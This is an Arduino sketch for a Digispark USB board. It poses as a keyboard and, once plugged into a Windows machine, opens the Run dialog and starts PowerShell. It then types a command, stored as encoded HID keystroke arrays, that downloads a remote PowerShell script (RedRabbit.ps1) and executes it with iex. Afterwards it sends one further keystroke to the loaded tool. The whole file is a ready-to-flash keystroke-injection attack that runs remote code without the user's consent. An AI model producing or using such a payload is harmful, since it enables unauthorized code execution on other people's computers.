#include "DigiKeyboard.h"

// powershell
const uint8_t key_arr_0[] PROGMEM = {0,19, 0,18, 0,26, 0,8, 0,21, 0,22, 0,11, 0,8, 0,15, 0,15};
// powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/securethelogs/RedRabbit/master/RedRabbit.ps1')"
const uint8_t key_arr_1[] PROGMEM = {0,19, 0,18, 0,26, 0,8, 0,21, 0,22, 0,11, 0,8, 0,15, 0,15, 0,44, 0,56, 0,17, 0,18, 0,19, 0,44, 0,56, 0,6, 0,44, 2,31, 0,12, 0,8, 0,27, 2,37, 2,17, 0,8, 0,26, 0,56, 2,18, 0,5, 0,13, 0,8, 0,6, 0,23, 0,44, 2,17, 0,8, 0,23, 0,55, 2,26, 0,8, 0,5, 2,6, 0,15, 0,12, 0,8, 0,17, 0,23, 2,38, 0,55, 2,7, 0,18, 0,26, 0,17, 0,15, 0,18, 0,4, 0,7, 2,22, 0,23, 0,21, 0,12, 0,17, 0,10, 2,37, 0,45, 0,11, 0,23, 0,23, 0,19, 0,22, 2,55, 2,36, 2,36, 0,21, 0,4, 0,26, 0,55, 0,10, 0,12, 0,23, 0,11, 0,24, 0,5, 0,24, 0,22, 0,8, 0,21, 0,6, 0,18, 0,17, 0,23, 0,8, 0,17, 0,23, 0,55, 0,6, 0,18, 0,16, 2,36, 0,22, 0,8, 0,6, 0,24, 0,21, 0,8, 0,23, 0,11, 0,8, 0,15, 0,18, 0,10, 0,22, 2,36, 2,21, 0,8, 0,7, 2,21, 0,4, 0,5, 0,5, 0,12, 0,23, 2,36, 0,16, 0,4, 0,22, 0,23, 0,8, 0,21, 2,36, 2,21, 0,8, 0,7, 2,21, 0,4, 0,5, 0,5, 0,12, 0,23, 0,55, 0,19, 0,22, 0,30, 0,45, 2,38, 2,31};
// h 
const uint8_t key_arr_2[] PROGMEM = {0,11, 0,44};

void duckyString(const uint8_t* keys, size_t len) {  
    for(size_t i=0; i<len; i+=2) {
        DigiKeyboard.sendKeyStroke(pgm_read_byte_near(keys + i+1), pgm_read_byte_near(keys + i));
    }
}

void setup() {
    pinMode(1, OUTPUT); // Enable LED
    digitalWrite(1, LOW); // Turn LED off
    DigiKeyboard.sendKeyStroke(0); // Tell computer no key is pressed

    DigiKeyboard.delay(500); // DELAY 500
    DigiKeyboard.sendKeyStroke(21, 8); // GUI r
    DigiKeyboard.delay(200); // DELAY 200
    duckyString(key_arr_0, sizeof(key_arr_0)); // STRING powershell
    DigiKeyboard.delay(5000); // DELAY 5000
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(500); // DELAY 500
    duckyString(key_arr_1, sizeof(key_arr_1)); // STRING powershell -nop -c "iex(New-Object Net....
    DigiKeyboard.delay(200); // DELAY 200
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(8000); // DELAY 8000
    duckyString(key_arr_2, sizeof(key_arr_2)); // STRING h 
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
}

void loop() {}